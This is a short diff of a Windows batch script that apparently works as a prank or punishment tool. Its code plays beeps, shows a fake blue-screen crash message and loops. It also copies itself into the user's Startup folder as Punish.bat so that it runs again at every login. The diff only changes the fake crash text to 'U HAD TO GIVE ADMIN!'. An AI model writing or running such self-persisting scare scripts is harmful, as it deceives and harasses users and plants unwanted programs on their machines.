@@ -19,7 +19,7 @@ color 0A
 powershell -c "[console]::beep(523,200); [console]::beep(659,200); [console]::beep(784,200)"
 
 :: === Fake BSOD in console ===
-start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been detected... && pause >nul"
+start cmd /c "color 1F && mode con: cols=80 lines=25 && echo U HAD TO GIVE ADMIN!... && pause >nul"
 
 :: === Copy self to user Startup (persistent) ===
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" /Y >nul
@@ -32,3 +32,4 @@ for %%x in (1,2,3) do (
 
 timeout /t 1 >nul
 goto loop
+
